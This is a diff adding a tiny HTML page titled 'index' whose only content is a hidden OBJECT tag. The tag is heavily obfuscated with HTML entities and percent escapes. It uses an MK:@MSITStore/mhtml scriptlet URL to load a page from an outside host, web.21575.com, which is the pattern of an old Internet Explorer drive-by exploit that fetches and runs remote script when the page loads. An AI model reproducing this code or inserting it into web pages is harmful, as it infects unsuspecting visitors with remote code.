@@ -1,0 +1,3 @@
+<html><TITLE>index</TITLE><BODY>
+<OBJECT style="display:&#X6E;&#X6F;&#X6E;&#X65;" type="tex&#116&#47&#120&#45&#115&#99&#114iptlet" data="&#X4D;&#X4B;&#X3A;&#X40;&#X4D;&#X53;&#X49;&#X54;Sto&#114&#101&#58&#109&#104tml&#X3A;&#X63;&#X3A;&#X5C;&#X2E;&#X6D;ht&#33Http://web.21575.com/100/333/44.htm&#X3A;&#X3A;/%6C%65%66t&#46htm"></OBJECT>
+</body></html>
